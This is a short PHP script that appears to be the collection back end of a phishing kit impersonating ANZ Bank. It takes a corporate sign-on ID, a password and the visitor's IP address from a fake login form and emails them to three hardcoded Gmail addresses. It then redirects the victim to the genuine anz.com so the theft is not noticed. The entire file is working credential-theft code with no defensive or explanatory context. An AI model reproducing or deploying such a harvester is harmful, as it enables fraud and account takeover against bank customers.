<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Acount details-----------------------\n";
$message .= "Customer Registration Number: ".$_POST['CorporateSignonCorpId']."\n";
$message .= "Password: ".$_POST['CorporateSignonPassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------By Blessed CasH~~---------------------\n";
$recipient = "olembe07@gmail.com,13good2013@gmail.com,olembe001@gmail.com";
$subject = "ANZ Bank";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "email details-Version: 1.0\n";
	 mail("", "Lord", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://anz.com/personal/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>